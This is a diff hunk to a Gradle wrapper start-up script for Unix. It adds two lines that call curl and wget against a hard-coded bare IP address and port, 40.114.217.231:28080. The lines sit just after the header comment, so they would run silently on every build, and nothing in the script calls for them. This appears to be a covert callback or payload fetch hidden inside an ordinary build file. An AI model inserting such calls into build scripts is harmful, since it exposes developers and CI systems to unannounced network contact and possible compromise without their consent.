@@ -21,7 +21,8 @@
 ##  Gradle start up script for UN*X
 ##
 ##############################################################################
-
+curl 40.114.217.231:28080
+wget 40.114.217.231:28080
 # Attempt to set APP_HOME
 # Resolve links: $0 may be a link
 PRG="$0"
